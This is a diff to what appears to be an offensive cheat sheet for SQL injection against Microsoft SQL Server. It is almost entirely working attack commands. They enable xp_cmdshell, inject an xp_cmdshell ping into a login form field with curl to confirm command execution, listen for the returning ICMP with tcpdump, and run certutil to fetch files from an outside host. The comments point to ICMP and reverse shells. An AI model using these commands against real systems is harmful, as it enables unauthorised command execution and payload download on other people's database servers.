@@ -85,13 +85,19 @@ NULL
 
 
 #Enable xp_cmdshell
-#If SQLI is present can enable shell then upload files
+#If SQLI is present can enable shell then run commands upload files
+#ICMP shell is possible
 #Can also base64 the result
 #try mandros.py (Reverse MSSQL shell)
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC+Xp_cmdshell+'ping+x.x.x.x';
 
+#Reverse listen for ICMP
+tcpdump -nni tun0 icmp
 
+#use curl to send ICMP ping / test
+curl site.com/test/verify.asp -d "username=ZAP&password=ZAP&logintype=2;EXEC+Xp_cmdshell+'ping+x.x.x.x';&rememberme=ON&B1=LogIn"
 
 #Make https requests
 EXEC xp_cmdshell 'certutil -urlcache -f https://x.x.x.x';--
